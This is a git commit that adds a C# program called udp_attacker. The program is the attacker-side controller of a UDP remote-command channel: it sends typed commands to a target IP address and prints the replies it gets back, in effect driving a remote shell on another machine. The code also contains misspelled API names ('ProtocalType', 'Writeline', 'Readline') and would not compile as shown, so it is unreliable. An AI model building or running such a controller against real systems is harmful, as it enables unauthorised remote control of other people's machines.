b6801897d138e93010bac289d59d78fdea31277d
kyleschnirring <kyleschnirring@gmail.com>
2017-02-26 11:49:39 -0800

    added udp_attacker

---
+++ udp_attacker.cs
@@ -0,0 +1,39 @@
+static void Main(string[] args) {
+  int lport = int.Parse(args[1]);
+
+  using (UdpClient listener = new UdpClient(lport)) {
+    IPEndPoint localEP = new IPEndPoint(IPAddress.Any, lport);
+    string output;
+    byte[] bytes;
+
+    using (Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocalType.Udp)) {
+      IPAddress addr = IPAddress.Parse(args[0]);
+      IPEndPoint addrEP = new IPEndPoint(addr, lport);
+      Console.Writeline ("Enter command to send, or a blank line to quit");
+
+      while (true) {
+        string command = Console.Readline();
+        byte[] buff = Encoding.ASCII.GetBytes(command);
+
+        try {
+          sock.SendTo(buff, addrEP);
+
+          if (string.IsNullOrEmpty(command)) {
+            sock.Close();
+            listener.Close();
+            return;
+          }
+
+          if (string.IsNullOrWhiteSpace(command))
+            continue;
+
+          bytes = listener.Receive(ref localEP);
+          output = Encoding.ASCII.GetString(bytes, 0, bytes.Length);
+          Console.WriteLine(output);
+        } catch(Exception ex) {
+          Console.WriteLine("Exception {0}", ex.Message);
+        }
+      }
+    }
+  }
+}
